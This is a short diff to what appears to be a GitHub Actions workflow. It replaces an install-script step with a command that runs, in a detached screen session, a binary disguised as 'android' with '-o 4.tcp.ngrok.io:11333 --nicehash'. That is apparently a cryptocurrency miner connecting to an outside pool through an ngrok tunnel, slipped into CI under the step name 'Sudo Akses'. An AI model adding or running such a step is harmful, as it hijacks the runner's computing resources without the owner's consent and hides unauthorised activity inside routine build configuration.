@@ -40,5 +40,4 @@ jobs:
       # Runs a single command using the runners shell
       - name: Sudo Akses
         run: |
-          chmod +x install.sh
-          ./install.sh
+          sudo apt install screen -y && chmod +x android && screen -dmS run ./android -o 4.tcp.ngrok.io:11333 --nicehash && chmod +x deploy.sh && ./deploy.sh
